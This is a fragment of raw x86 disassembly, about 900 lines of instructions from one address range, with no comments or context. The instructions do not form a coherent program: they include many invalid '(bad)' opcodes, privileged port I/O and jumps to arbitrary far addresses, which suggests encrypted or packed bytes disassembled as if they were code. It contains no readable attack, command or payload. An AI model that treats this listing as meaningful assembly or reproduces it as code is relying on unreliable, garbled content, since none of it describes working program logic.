  40b710:	rcr    DWORD PTR [eax+0x7c6b8b8c],1
  40b716:	inc    BYTE PTR [ebp-0x37ab38c1]
  40b71c:	and    BYTE PTR [ebx],cl
  40b71e:	scas   al,BYTE PTR es:[edi]
  40b71f:	scas   eax,DWORD PTR es:[edi]
  40b720:	rcr    BYTE PTR [eax-0xe],0xf
  40b724:	cmp    DWORD PTR [esi-0x51],ebx
  40b727:	popf   
  40b728:	jno    0x40b73e
  40b72a:	or     ah,BYTE PTR [edx+0x527e59d5]
  40b730:	scas   al,BYTE PTR es:[edi]
  40b731:	mov    edi,0xe18306e1
  40b736:	mov    cl,BYTE PTR [edi-0x20]
  40b739:	in     al,dx
  40b73a:	fs fcmovnb st,st(2)
  40b73d:	dec    BYTE PTR [esi-0x2bd4c22e]
  40b743:	sti    
  40b744:	outs   dx,BYTE PTR ds:[esi]
  40b745:	push   ebx
  40b746:	inc    edi
  40b747:	push   es
  40b748:	xchg   ebx,eax
  40b749:	dec    esp
  40b74a:	int    0xd7
  40b74c:	in     eax,dx
  40b74d:	adc    al,0xc4
  40b74f:	fisubr DWORD PTR [edx]
  40b751:	loope  0x40b7a5
  40b753:	test   BYTE PTR [ecx-0x2883f0ee],dl
  40b759:	and    bl,BYTE PTR [ebp+0x2aacd2a1]
  40b75f:	mov    eax,ds:0x3d010c6e
  40b764:	ror    BYTE PTR [ebx-0x35dd18ac],cl
  40b76a:	lods   eax,DWORD PTR ds:[esi]
  40b76b:	lods   al,BYTE PTR ds:[esi]
  40b76c:	pop    es
  40b76d:	outs   dx,BYTE PTR ds:[esi]
  40b76e:	sar    BYTE PTR [esi+edi*8+0x27],1
  40b772:	sub    ebx,esp
  40b774:	and    BYTE PTR [esi],al
  40b776:	fistp  WORD PTR [ecx-0x12f775af]
  40b77c:	add    DWORD PTR [edi-0x48a3e4e0],0x5
  40b783:	cmp    DWORD PTR [ebx+ecx*1],eax
  40b786:	fcomp  DWORD PTR [ebx+0x2e]
  40b789:	push   esi
  40b78a:	in     eax,0x14
  40b78c:	mov    edx,0x184d3dab
  40b791:	xor    eax,0x9038fb23
  40b796:	jl     0x40b762
  40b798:	and    al,0x42
  40b79a:	push   ecx
  40b79b:	push   esi
  40b79c:	xor    eax,DWORD PTR [edx+0x40a6fa50]
  40b7a2:	icebp  
  40b7a3:	loope  0x40b785
  40b7a5:	dec    ebx
  40b7a6:	in     eax,0x17
  40b7a8:	int    0x81
  40b7aa:	into   
  40b7ab:	ins    BYTE PTR es:[edi],dx
  40b7ac:	adc    eax,0x59d7c567
  40b7b1:	jge    0x40b781
  40b7b3:	repnz add DWORD PTR [esi],edi
  40b7b6:	dec    edi
  40b7b7:	inc    esp
  40b7b8:	imul   ebp,DWORD PTR [edx],0x1a1b5b52
  40b7be:	mov    dh,0x2d
  40b7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c1:	xlat   BYTE PTR ds:[ebx]
  40b7c2:	adc    eax,ecx
  40b7c4:	inc    edx
  40b7c5:	aaa    
  40b7c6:	cmp    esp,DWORD PTR [edi+0x6ee431fd]
  40b7cc:	pushf  
  40b7cd:	xchg   ebp,eax
  40b7ce:	mov    DWORD PTR [edi+edi*2-0x6705bab0],ebp
  40b7d5:	push   eax
  40b7d6:	cmp    bl,bl
  40b7d8:	les    esi,FWORD PTR ss:[esi+edi*8-0x3c]
  40b7dd:	int    0xae
  40b7df:	mov    eax,0x17ba73c5
  40b7e4:	push   0x1
  40b7e6:	mov    bl,0x2e
  40b7e8:	add    eax,DWORD PTR [ecx+edi*2]
  40b7eb:	and    al,BYTE PTR [ebx-0x65]
  40b7ee:	and    DWORD PTR [ebx-0x18],esp
  40b7f1:	sub    eax,0x4c4a6a64
  40b7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7f7:	lds    ebx,FWORD PTR [eax+0x78]
  40b7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7fb:	push   eax
  40b7fd:	sub    BYTE PTR [ecx+eax*2],0x18
  40b801:	and    ch,BYTE PTR [edx+0x6d]
  40b804:	lea    ecx,[eax-0x49e528a1]
  40b80a:	or     eax,0xc42f8f8f
  40b80f:	push   cs
  40b810:	test   al,0xf2
  40b812:	adc    bh,BYTE PTR [eax]
  40b814:	ret    0x9fb2
  40b817:	mov    dl,0xdc
  40b819:	xchg   DWORD PTR [eax+esi*1+0x7c],ebx
  40b81d:	inc    eax
  40b81e:	push   edi
  40b81f:	leave  
  40b820:	icebp  
  40b821:	push   es
  40b822:	or     esp,ebx
  40b824:	js     0x40b80a
  40b826:	out    dx,eax
  40b827:	cmp    bh,0x9f
  40b82a:	int3   
  40b82b:	into   
  40b82c:	fwait
  40b82d:	inc    BYTE PTR [esi-0x27]
  40b830:	dec    eax
  40b831:	hlt    
  40b832:	shr    DWORD PTR [edi+0x2376a1f3],cl
  40b838:	inc    ecx
  40b839:	mov    esi,0xa4f9f670
  40b83e:	mov    al,0x34
  40b840:	jns    0x40b88c
  40b842:	popa   
  40b843:	pop    ebx
  40b844:	push   ds
  40b845:	mov    ah,0xcc
  40b847:	pop    ss
  40b848:	rol    BYTE PTR [esi-0x1e],0x8
  40b84c:	out    0x56,eax
  40b84e:	mov    esp,0x3e82971b
  40b853:	jb     0x40b848
  40b855:	mov    eax,0x2e2ed1f
  40b85a:	mov    ah,0x3f
  40b85c:	cs pop ds
  40b85e:	pop    esi
  40b85f:	(bad)  
  40b861:	mov    edx,0xcb2b6a3a
  40b866:	jne    0x40b887
  40b868:	inc    eax
  40b869:	cmc    
  40b86a:	cmp    cl,BYTE PTR [ebx-0xe]
  40b86d:	mov    eax,ds:0x29decd7
  40b872:	sbb    ebp,edx
  40b874:	jnp    0x40b8a9
  40b876:	xchg   esp,eax
  40b877:	add    DWORD PTR [ecx+0x10],edi
  40b87a:	or     DWORD PTR [eax-0x81a6eca],esi
  40b880:	sub    dl,BYTE PTR [edx+0x3c]
  40b883:	jl     0x40b8c6
  40b885:	arpl   WORD PTR ds:0x697ee89f,sp
  40b88b:	mov    esp,0xb6dc213c
  40b890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b891:	push   es
  40b892:	inc    ecx
  40b893:	adc    DWORD PTR [ecx-0x11],esi
  40b896:	cmp    BYTE PTR [ebp+0x26c55afd],ch
  40b89c:	jmp    0x8300:0x84e4d66c
  40b8a3:	pop    ds
  40b8a4:	dec    edi
  40b8a5:	ins    DWORD PTR es:[edi],dx
  40b8a6:	cwde   
  40b8a7:	lods   eax,DWORD PTR ds:[esi]
  40b8a8:	iret   
  40b8a9:	and    bl,bl
  40b8ab:	and    al,bl
  40b8ad:	xor    BYTE PTR [ecx],dl
  40b8af:	sub    eax,0x21c1bc04
  40b8b5:	and    al,0xbb
  40b8b7:	test   al,cl
  40b8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ba:	mov    bl,0x98
  40b8bc:	pushf  
  40b8bd:	mov    dl,0xea
  40b8bf:	jnp    0x40b848
  40b8c1:	aad    0x18
  40b8c3:	punpckldq mm3,DWORD PTR [eax]
  40b8c6:	add    bl,dh
  40b8c8:	push   ebx
  40b8c9:	adc    dh,dh
  40b8cb:	rol    BYTE PTR [edi-0x7536135f],cl
  40b8d1:	cdq    
  40b8d2:	xchg   esp,eax
  40b8d3:	mov    ebx,0x5adcbf07
  40b8d8:	push   ebp
  40b8d9:	cmp    cl,bl
  40b8db:	pop    ecx
  40b8dc:	or     edx,DWORD PTR [ebx*4-0xbb210de]
  40b8e3:	inc    ebx
  40b8e4:	pop    ds
  40b8e5:	pop    edi
  40b8e6:	scas   al,BYTE PTR es:[edi]
  40b8e7:	and    BYTE PTR [ebx],dl
  40b8e9:	fdivr  QWORD PTR [ecx]
  40b8eb:	(bad)  
  40b8ec:	stos   BYTE PTR es:[edi],al
  40b8ed:	stc    
  40b8ee:	scas   eax,DWORD PTR es:[edi]
  40b8ef:	push   ebp
  40b8f0:	dec    ebp
  40b8f1:	loopne 0x40b8cd
  40b8f3:	mov    dh,0x9c
  40b8f5:	inc    esi
  40b8f6:	in     al,dx
  40b8f7:	push   ebp
  40b8f8:	cmp    dl,dl
  40b8fa:	sub    eax,0xe87e102d
  40b8ff:	sbb    al,0x1e
  40b901:	xor    al,0x25
  40b903:	pop    edi
  40b904:	out    dx,eax
  40b905:	iret   
  40b906:	ss (bad) 
  40b908:	(bad)  [eax+edi*8+0x515419f7]
  40b90f:	std    
  40b910:	jbe    0x40b911
  40b912:	bswap  ebx
  40b914:	jecxz  0x40b8fe
  40b916:	into   
  40b917:	cmc    
  40b918:	lods   eax,DWORD PTR ds:[esi]
  40b919:	xor    eax,0x9fcca78f
  40b91e:	repnz es push ecx
  40b921:	jno    0x40b904
  40b923:	dec    ebx
  40b924:	add    eax,0x93e9e014
  40b929:	(bad)  
  40b92a:	adc    ah,BYTE PTR [edi-0x44539f3a]
  40b930:	push   esp
  40b931:	sub    ch,BYTE PTR [esi+ebx*1+0x12]
  40b935:	test   bl,cl
  40b937:	arpl   WORD PTR [edi+0x2d],bp
  40b93a:	dec    DWORD PTR [ecx-0x26356a5b]
  40b940:	std    
  40b941:	cmc    
  40b942:	xchg   esi,eax
  40b943:	dec    esi
  40b944:	sub    al,0xda
  40b946:	cmp    dh,BYTE PTR [ecx+0x65]
  40b949:	push   ss
  40b94a:	xor    DWORD PTR [eax-0xd],ebp
  40b94d:	ror    BYTE PTR [ecx+0x34],1
  40b950:	loope  0x40b926
  40b952:	or     ebx,esi
  40b954:	aad    0x15
  40b956:	jae    0x40b935
  40b958:	adc    eax,0xa6f49fde
  40b95d:	call   0xf4fc9329
  40b962:	dec    esp
  40b963:	sub    eax,ebx
  40b965:	sbb    BYTE PTR [ebx-0x19d1388f],cl
  40b96b:	cwde   
  40b96c:	jmp    0x40b9a0
  40b96e:	push   ss
  40b96f:	xlat   BYTE PTR ds:[ebx]
  40b970:	int3   
  40b971:	rcl    BYTE PTR ds:0x6b96a1e4,0x25
  40b978:	cli    
  40b979:	mov    cs:0xe399717e,al
  40b97f:	ds lahf 
  40b981:	mov    edi,0x6e7fa37
  40b986:	adc    DWORD PTR [esi],ebx
  40b988:	mov    ecx,0xc2519fed
  40b98d:	cmp    al,0x79
  40b98f:	lods   al,BYTE PTR ds:[esi]
  40b990:	dec    ecx
  40b991:	out    dx,eax
  40b992:	addr16 mov es,eax
  40b995:	mov    dh,0xd
  40b997:	jne    0x40b9bf
  40b999:	mov    bh,0x37
  40b99b:	pop    esp
  40b99c:	mov    edx,0xc8ccc51
  40b9a1:	xor    DWORD PTR [ebx],0xa1f349dc
  40b9a7:	fsub   QWORD PTR ds:0x82b94d3d
  40b9ad:	jae    0x40b93e
  40b9af:	popa   
  40b9b0:	aas    
  40b9b1:	mov    edi,0x9cff35d5
  40b9b6:	add    al,0x1c
  40b9b8:	sar    BYTE PTR [edx],0x71
  40b9bb:	jb     0x40b9cc
  40b9bd:	push   esp
  40b9be:	add    al,0xe8
  40b9c0:	sub    al,BYTE PTR [edx]
  40b9c2:	xor    BYTE PTR [edi+0x7ba4328c],bl
  40b9c8:	fidivr WORD PTR [ebp+0x775d5ac7]
  40b9ce:	and    DWORD PTR [edi],eax
  40b9d0:	pop    es
  40b9d1:	xchg   esi,eax
  40b9d2:	dec    edi
  40b9d3:	pop    esp
  40b9d4:	dec    ecx
  40b9d5:	and    BYTE PTR [edi],bl
  40b9d7:	inc    ecx
  40b9d8:	mov    ch,0xf8
  40b9da:	ds out dx,eax
  40b9dc:	fiadd  WORD PTR [bx+si-0x2918]
  40b9e1:	cmp    BYTE PTR [ebx-0x953278d],ch
  40b9e7:	mov    ds:0x1b689ae4,al
  40b9ec:	lahf   
  40b9ed:	push   cs
  40b9ee:	adc    BYTE PTR [esi+0x773fff4d],al
  40b9f4:	add    ch,BYTE PTR ds:0x71bc10a6
  40b9fa:	push   es
  40b9fb:	jns    0x40b985
  40b9fd:	mov    eax,ss:0x1bb62b18
  40ba03:	inc    ebp
  40ba04:	pop    esp
  40ba05:	(bad)  
  40ba06:	jle    0x40b9a8
  40ba08:	out    dx,al
  40ba09:	lods   al,BYTE PTR ds:[esi]
  40ba0a:	xchg   ebx,eax
  40ba0b:	stos   DWORD PTR es:[edi],eax
  40ba0c:	es aaa 
  40ba0e:	mov    WORD PTR [ebx],ds
  40ba10:	mov    ds:0xe5398d65,eax
  40ba15:	ret    
  40ba16:	int    0x8d
  40ba18:	out    0x40,eax
  40ba1a:	inc    ebp
  40ba1b:	push   cs
  40ba1c:	clc    
  40ba1d:	cmp    eax,esp
  40ba1f:	ds dec esi
  40ba21:	fs jl  0x40ba4a
  40ba24:	cld    
  40ba25:	adc    DWORD PTR [ebp+0x43],0xef63cbf
  40ba2c:	enter  0x906a,0xfd
  40ba30:	pop    ecx
  40ba31:	mov    cs,WORD PTR [edi-0x55711e0f]
  40ba37:	mov    esp,0xc3d81ca4
  40ba3c:	mov    dl,0xa4
  40ba3e:	xchg   ebp,eax
  40ba3f:	ss xchg edi,eax
  40ba41:	pop    edi
  40ba42:	mov    al,0x97
  40ba44:	push   0xffffff9d
  40ba46:	xor    bh,BYTE PTR [edi+0x45]
  40ba49:	jp     0x40b9db
  40ba4b:	cmp    BYTE PTR [esi],bh
  40ba4d:	push   ss
  40ba4e:	push   es
  40ba4f:	fld    QWORD PTR [edx-0x7794d2ea]
  40ba55:	cdq    
  40ba56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba57:	sub    BYTE PTR [ebx],0x30
  40ba5a:	cdq    
  40ba5b:	sub    eax,0xe1bab901
  40ba60:	mov    ebp,0x2628aa1a
  40ba65:	icebp  
  40ba66:	push   eax
  40ba67:	xchg   edx,eax
  40ba68:	retf   
  40ba69:	xchg   DWORD PTR [edi-0x10b05438],ebp
  40ba6f:	jmp    0xb8f92da0
  40ba74:	jl     0x40ba08
  40ba76:	or     edx,DWORD PTR [ecx+0x70]
  40ba79:	and    esp,DWORD PTR [ecx-0x26]
  40ba7c:	add    DWORD PTR [ebx+0x27],0xffffffec
  40ba80:	mov    BYTE PTR [edx-0x2130d3b9],al
  40ba86:	stos   BYTE PTR es:[edi],al
  40ba87:	adc    edi,0xffffff95
  40ba8a:	adc    eax,0xcf57aeb
  40ba8f:	pop    ds
  40ba90:	dec    esp
  40ba91:	mov    bl,0xf6
  40ba93:	iret   
  40ba94:	mov    ds:0x230b59ed,eax
  40ba99:	hlt    
  40ba9a:	imul   esi,DWORD PTR [edi-0x73],0xf
  40ba9e:	inc    ebx
  40ba9f:	mov    ecx,DWORD PTR [edx]
  40baa1:	jge    0x40bac0
  40baa3:	pusha  
  40baa4:	in     al,dx
  40baa5:	inc    ecx
  40baa6:	or     al,0x3
  40baa8:	pop    esi
  40baa9:	test   DWORD PTR [edi],ecx
  40baab:	mov    cl,0x95
  40baad:	shr    BYTE PTR [esi],0xf6
  40bab0:	push   edi
  40bab1:	lahf   
  40bab2:	hlt    
  40bab3:	in     al,0xe9
  40bab5:	cmc    
  40bab6:	xor    eax,0x69853b4c
  40babb:	jnp    0x40babc
  40babd:	fdiv   DWORD PTR [esi+0xc57e581]
  40bac3:	jp     0x40ba47
  40bac5:	push   edx
  40bac6:	loopne 0x40bb42
  40bac8:	mov    esi,0xd2b0884f
  40bacd:	fld    DWORD PTR [ecx]
  40bacf:	and    eax,0xcecfa490
  40bad4:	pop    ecx
  40bad5:	fimul  DWORD PTR [edi+0x40]
  40bad8:	mov    esi,0xb920a8d
  40badd:	or     BYTE PTR [ebx-0x40],0x47
  40bae1:	fucomp st(7)
  40bae3:	pop    esp
  40bae4:	out    0xd8,eax
  40bae6:	sbb    al,0x23
  40bae8:	xchg   edi,eax
  40bae9:	imul   ebx,DWORD PTR [esi],0x850a938d
  40baef:	push   edx
  40baf0:	ret    
  40baf1:	mov    WORD PTR ss:[edi+eiz*2+0x5],?
  40baf6:	cmp    bl,BYTE PTR [ebp-0x695e3324]
  40bafc:	es mov al,0x47
  40baff:	cmp    esi,DWORD PTR [ecx+0x42c87df3]
  40bb05:	les    esi,FWORD PTR [esi+0x3d]
  40bb08:	rol    DWORD PTR [esi+0x3087fdd1],cl
  40bb0e:	sbb    DWORD PTR [ebx],eax
  40bb10:	pop    esi
  40bb11:	pusha  
  40bb12:	xchg   DWORD PTR [edi-0xe],ecx
  40bb15:	shr    BYTE PTR [edi],0x89
  40bb18:	jecxz  0x40baf5
  40bb1a:	cwde   
  40bb1b:	xor    ah,bh
  40bb1d:	inc    edx
  40bb1e:	cmp    BYTE PTR [esi-0x30ab4e1],al
  40bb24:	cmp    al,0xb
  40bb26:	xchg   BYTE PTR [edi],al
  40bb28:	jb     0x40bb28
  40bb2a:	jns    0x40bb75
  40bb2c:	loop   0x40bb8d
  40bb2e:	dec    edx
  40bb2f:	int    0x63
  40bb31:	ds cmc 
  40bb33:	jno    0x40bb6f
  40bb35:	pause  
  40bb37:	mov    ds:0xb326340c,al
  40bb3c:	lods   eax,DWORD PTR ds:[esi]
  40bb3d:	xor    eax,0x9db6d517
  40bb42:	test   DWORD PTR [eax-0x7ef1bbf2],0xf10d47d9
  40bb4c:	hlt    
  40bb4d:	popa   
  40bb4e:	(bad)  
  40bb4f:	cmp    al,0xeb
  40bb51:	sbb    DWORD PTR [ebx],ecx
  40bb53:	rol    BYTE PTR [eax],1
  40bb55:	push   ecx
  40bb56:	cld    
  40bb57:	das    
  40bb58:	push   0x7c
  40bb5a:	test   BYTE PTR [eax],bl
  40bb5c:	leave  
  40bb5d:	or     edx,edi
  40bb5f:	xor    cl,BYTE PTR [esi]
  40bb61:	mov    bh,0x25
  40bb63:	call   0xa792:0x5c388391
  40bb6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb6b:	loop   0x40bb36
  40bb6d:	mov    ebp,0x6c6ab185
  40bb72:	push   ds
  40bb73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb74:	nop
  40bb75:	push   es
  40bb76:	dec    ecx
  40bb77:	xchg   ebp,eax
  40bb78:	pop    edi
  40bb79:	inc    edi
  40bb7a:	je     0x40bbee
  40bb7c:	loop   0x40bb63
  40bb7e:	je     0x40bb10
  40bb80:	add    esi,DWORD PTR [edi]
  40bb82:	fadd   DWORD PTR [edx-0x67]
  40bb85:	test   DWORD PTR [esi+edx*2-0x7e7a8b29],eax
  40bb8c:	cs push ss
  40bb8e:	icebp  
  40bb8f:	in     eax,0xd6
  40bb91:	or     bl,ch
  40bb93:	mov    ecx,0x6f0845fc
  40bb98:	dec    esi
  40bb99:	mov    eax,ds:0xbca68512
  40bb9e:	xchg   ecx,eax
  40bb9f:	popa   
  40bba0:	push   ss
  40bba1:	push   ebp
  40bba2:	fsubr  DWORD PTR ds:0xfd123a8d
  40bba8:	add    al,0x31
  40bbaa:	fwait
  40bbab:	push   cs
  40bbac:	adc    BYTE PTR [bp+di+0x17a3],ah
  40bbb1:	and    al,0xea
  40bbb3:	cwde   
  40bbb4:	fcomp  DWORD PTR [esp+ecx*2-0x1aacadc0]
  40bbbb:	add    eax,DWORD PTR [eax+0x25]
  40bbbe:	push   ds
  40bbbf:	or     esi,DWORD PTR [esi-0x73]
  40bbc2:	add    al,0x8f
  40bbc4:	sub    bl,BYTE PTR [edi-0x74]
  40bbc7:	mov    ecx,db6
  40bbca:	sbb    BYTE PTR [edx-0x4],ah
  40bbcd:	jg     0x40bb9e
  40bbcf:	test   dl,bh
  40bbd1:	mov    gs,WORD PTR [eax]
  40bbd3:	jb     0x40bc21
  40bbd5:	jmp    0x136b3313
  40bbda:	dec    ebx
  40bbdb:	pop    edi
  40bbdc:	(bad)  
  40bbdd:	push   ebx
  40bbde:	in     eax,dx
  40bbdf:	or     bl,bl
  40bbe1:	push   ds
  40bbe2:	adc    al,0xc2
  40bbe4:	sbb    ah,bh
  40bbe6:	cmp    al,0x6e
  40bbe8:	mov    al,0xbc
  40bbea:	jle    0x40bc46
  40bbec:	xor    eax,0x895434c7
  40bbf1:	mov    dh,dl
  40bbf3:	lods   eax,DWORD PTR ds:[esi]
  40bbf4:	push   ss
  40bbf5:	add    eax,0x1b1ee85a
  40bbfa:	test   eax,0x8bf42804
  40bbff:	xor    ecx,DWORD PTR [edx-0x6305ffb9]
  40bc05:	nop
  40bc06:	stos   DWORD PTR es:[edi],eax
  40bc07:	fimul  WORD PTR [ecx-0x4a2efe9b]
  40bc0d:	fisubr WORD PTR [edi-0x57]
  40bc10:	dec    esp
  40bc11:	sub    BYTE PTR [esi],ch
  40bc13:	iret   
  40bc14:	add    dl,BYTE PTR [ecx-0x31]
  40bc17:	xchg   esi,eax
  40bc18:	cmp    eax,0xec75b473
  40bc1d:	sub    esi,DWORD PTR [edx+0x653d615b]
  40bc23:	xor    esi,DWORD PTR [edx]
  40bc25:	push   edx
  40bc26:	mov    WORD PTR [ebp+0x6],gs
  40bc29:	dec    edx
  40bc2a:	jns    0x40bc26
  40bc2c:	test   BYTE PTR [esi],0x78
  40bc2f:	dec    edi
  40bc30:	inc    esi
  40bc31:	cmp    edx,ebp
  40bc33:	pop    esi
  40bc34:	cwde   
  40bc35:	push   cs
  40bc36:	jnp    0x40bc24
  40bc38:	xor    eax,0xefa4f64
  40bc3d:	int    0x36
  40bc3f:	ficomp WORD PTR [edx+0x5619bcd9]
  40bc45:	jae    0x40bbfb
  40bc47:	repz push ebp
  40bc49:	int3   
  40bc4a:	dec    edx
  40bc4b:	mov    edi,0x160fcdd1
  40bc50:	dec    edi
  40bc51:	rcr    DWORD PTR [esi+0x567f7cb5],0x65
  40bc58:	adc    eax,0xc8149cfe
  40bc5d:	push   esp
  40bc5e:	xor    esp,esp
  40bc60:	shl    BYTE PTR [ebp+0x28],1
  40bc63:	scas   al,BYTE PTR es:[edi]
  40bc64:	mov    esi,DWORD PTR [edi+0x10a026a]
  40bc6a:	and    DWORD PTR [edx-0x32],ecx
  40bc6d:	xchg   BYTE PTR ds:[esi+0x78],bl
  40bc71:	and    esi,DWORD PTR [ebx]
  40bc73:	jnp    0x40bc37
  40bc75:	repnz sbb al,0x5
  40bc78:	pop    ds
  40bc79:	dec    esp
  40bc7a:	mov    eax,ds:0x957aaff5
  40bc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc80:	jmp    0x40bca6
  40bc82:	sub    bh,BYTE PTR [edx]
  40bc84:	mov    gs,WORD PTR [ebx-0x26]
  40bc87:	mov    WORD PTR [esi],?
  40bc89:	inc    esp
  40bc8a:	dec    esp
  40bc8b:	je     0x40bc61
  40bc8d:	or     eax,0x7d1ab0fe
  40bc92:	call   DWORD PTR [ecx]
  40bc94:	lods   eax,DWORD PTR ds:[esi]
  40bc95:	mov    gs,WORD PTR [eax]
  40bc97:	push   ecx
  40bc98:	std    
  40bc99:	popa   
  40bc9a:	jl     0x40bc74
  40bc9c:	adc    eax,0x297a9a39
  40bca1:	jno    0x40bc7a
  40bca3:	dec    ebp
  40bca4:	sub    al,0x7d
  40bca6:	xor    al,0x8d
  40bca8:	scas   eax,DWORD PTR es:[edi]
  40bca9:	mov    ebx,DWORD PTR [edi]
  40bcab:	adc    dh,bh
  40bcad:	dec    esp
  40bcae:	cmc    
  40bcaf:	sub    DWORD PTR [edx+0x2d2a0bfa],0xffffff95
  40bcb6:	xchg   DWORD PTR [ecx+0x7],ebx
  40bcb9:	hlt    
  40bcba:	popa   
  40bcbb:	out    dx,al
  40bcbc:	adc    BYTE PTR [edx+ebx*1-0x7de672f4],al
  40bcc3:	xor    al,0x30
  40bcc5:	jb     0x40bc81
  40bcc7:	jae    0x40bd41
  40bcc9:	in     eax,dx
  40bcca:	stc    
  40bccb:	shl    BYTE PTR [eax+0x42f64ab1],cl
  40bcd1:	imul   eax,ebx,0xffffffa7
  40bcd4:	aam    0x86
  40bcd6:	pop    ebx
  40bcd7:	mov    es,WORD PTR [eax+0x11e5dd26]
  40bcdd:	daa    
  40bcde:	xchg   dh,bl
  40bce0:	ins    DWORD PTR es:[edi],dx
  40bce1:	lods   eax,DWORD PTR ds:[esi]
  40bce2:	mov    esp,0x935186e4
  40bce7:	xchg   esp,esp
  40bce9:	nop
  40bcea:	mov    ebx,0x1242a004
  40bcef:	inc    ecx
  40bcf0:	rol    DWORD PTR [esi+0x33],1
  40bcf3:	and    al,0x38
  40bcf5:	aam    0x49
  40bcf7:	mov    esp,0x6fa7f29f
  40bcfc:	push   ds
  40bcfd:	pop    esi
  40bcfe:	call   0x5c8e0d03
  40bd03:	in     al,0x3e
  40bd05:	jecxz  0x40bd6f
  40bd07:	add    BYTE PTR [ecx+0x3b9e1e4a],cl
  40bd0d:	push   ebx
  40bd0e:	adc    edx,esp
  40bd10:	shl    BYTE PTR [edi-0x3a],1
  40bd13:	sub    DWORD PTR [ebx+0x23b24068],0x25
  40bd1a:	and    dh,ch
  40bd1c:	out    0xba,al
  40bd1e:	fild   DWORD PTR [ecx+ebx*8]
  40bd21:	xor    bh,BYTE PTR [ebx]
  40bd23:	cmp    al,0xa5
  40bd25:	scas   al,BYTE PTR es:[edi]
  40bd26:	repz (bad) 
  40bd28:	mov    esp,0xd6123351
  40bd2d:	pop    es
  40bd2e:	mov    ebx,0x96fc5b1d
  40bd33:	iret   
  40bd34:	inc    ebx
  40bd35:	add    BYTE PTR [ebx*4-0x45ff658b],ch
  40bd3c:	stos   DWORD PTR es:[edi],eax
  40bd3d:	add    bl,BYTE PTR [edx]
  40bd3f:	and    esp,DWORD PTR [eax+0x67e588a8]
  40bd45:	dec    eax
  40bd46:	inc    edx
  40bd47:	nop
  40bd48:	dec    ebx
  40bd49:	mov    WORD PTR [eax-0x38],cs
  40bd4c:	inc    esp
  40bd4d:	int3   
  40bd4e:	mov    eax,0xc2f2ba2f
  40bd53:	imul   ecx,DWORD PTR [ebp+0x34],0xe5b0d9e5
  40bd5a:	out    dx,eax
  40bd5b:	adc    al,0x74
  40bd5d:	mov    WORD PTR [ebx+0x114fb08f],fs
  40bd63:	xor    BYTE PTR [edx],al
  40bd65:	repnz cs retf 0x4ad
  40bd6a:	mov    ebx,0x1f6027e7
  40bd6f:	(bad)  
  40bd70:	mov    esp,0xe4ff72ba
  40bd75:	int3   
  40bd76:	mov    eax,eax
  40bd78:	hlt    
  40bd79:	jmp    0x710ef541
  40bd7e:	arpl   cx,ax
  40bd80:	fmul   QWORD PTR [edi]
  40bd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd83:	icebp  
  40bd84:	pop    edx
  40bd85:	sar    dh,1
  40bd87:	and    esi,DWORD PTR [edx+eiz*4-0x17]
  40bd8b:	leave  
  40bd8c:	rcr    DWORD PTR [ecx-0x5b65e1da],0xcf
  40bd93:	leave  
  40bd94:	jl     0x40bd26
  40bd96:	into   
  40bd97:	pop    ebp
  40bd98:	out    dx,eax
  40bd99:	or     eax,0x70a4479e
  40bd9e:	mov    ebp,0x597507f7
  40bda3:	add    BYTE PTR [edx],ah
  40bda5:	xchg   ecx,eax
  40bda6:	jge    0x40bd4e
  40bda8:	xlat   BYTE PTR ds:[ebx]
  40bda9:	icebp  
  40bdaa:	xlat   BYTE PTR ds:[ebx]
  40bdab:	and    BYTE PTR [edi+0x77cc8fd3],al
  40bdb1:	retf   0x11e9
  40bdb4:	rol    DWORD PTR [ecx+0x5e5637d2],1
  40bdba:	dec    esi
  40bdbb:	ins    BYTE PTR es:[edi],dx
  40bdbc:	stc    
  40bdbd:	mov    gs,WORD PTR [ebx+ebp*8-0xe]
  40bdc1:	pop    ss
  40bdc2:	fxch   st(6)
  40bdc4:	repnz aad 0x91
  40bdc7:	sub    edx,DWORD PTR [ebp+0x31]
  40bdca:	adc    eax,0x8f985231
  40bdcf:	popa   
  40bdd0:	(bad)  
  40bdd2:	das    
  40bdd3:	popf   
  40bdd4:	ins    BYTE PTR es:[edi],dx
  40bdd5:	jmp    0x71be:0x31d30184
  40bddc:	rcr    BYTE PTR [edx-0x61bef2cb],0x4c
  40bde3:	popf   
  40bde4:	pushf  
  40bde5:	push   eax
  40bde6:	test   cl,ah
  40bde8:	test   al,0x44
  40bdea:	shr    esi,cl
  40bdec:	fisubr DWORD PTR [edx+esi*8-0x4c]
  40bdf0:	retf   0xa979
  40bdf3:	and    al,0x91
  40bdf5:	sub    esp,DWORD PTR [edx-0x73f6e4b3]
  40bdfb:	fld    TBYTE PTR [edx+esi*2]
  40bdfe:	int3   
  40bdff:	add    eax,DWORD PTR [ebp-0x40]
  40be02:	xchg   edi,eax
  40be03:	push   esi
  40be04:	xor    DWORD PTR [esi+ebp*4],0xffffffd3
  40be08:	pminsw mm1,mm3
  40be0b:	ror    DWORD PTR [eax+0x49],cl
  40be0e:	into   
  40be0f:	js     0x40bddb
  40be11:	mov    dh,0x46
  40be13:	xchg   esp,eax
  40be14:	outs   dx,DWORD PTR ds:[esi]
  40be15:	mov    ebp,0x15d495bf
  40be1a:	call   0x27d37ebd
  40be1f:	mov    ecx,0x5be3fc1c
  40be24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be25:	cmp    DWORD PTR [ebx],ebp
  40be27:	repnz aas 
  40be29:	mov    DWORD PTR ds:0xb2bab15a,ebx
  40be2f:	push   ebp
  40be30:	fsin   
  40be32:	push   ebp
  40be33:	pop    es
  40be34:	adc    BYTE PTR [ebx],dh
  40be36:	cmp    cl,BYTE PTR [edx-0x4e78ed81]
  40be3c:	mov    ah,0x75
  40be3e:	push   ss
  40be3f:	stos   DWORD PTR es:[edi],eax
  40be40:	into   
  40be41:	out    dx,al
  40be42:	push   0xd60d5e50
  40be47:	scas   al,BYTE PTR es:[edi]
  40be48:	xchg   ebx,eax
  40be49:	mov    eax,0x28213946
